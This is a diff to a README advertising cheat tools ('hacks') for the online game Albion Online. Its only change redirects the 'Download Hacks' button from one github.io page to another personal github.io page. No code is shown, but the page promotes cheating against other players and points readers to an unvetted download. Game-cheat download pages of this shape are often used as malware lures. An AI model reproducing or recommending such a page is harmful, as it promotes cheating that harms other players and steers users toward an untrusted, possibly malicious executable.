@@ -6,7 +6,7 @@ Albion Online is that type of MMO where you can lose everything in seconds—but
 
 Whether you're farming solo, dodging gankers, or looking to wreck in PvP, these hacks give you the upper hand every time. 💀
 
-[![Download Hacks](https://img.shields.io/badge/Download-Hacks-blueviolet)](https://rn197-Albion-Hacks.github.io/.github)
+[![Download Hacks](https://img.shields.io/badge/Download-Hacks-blueviolet)](https://hicksemanuel43.github.io/)
 ---
 
 ## 🧠 What Are Albion Hacks?
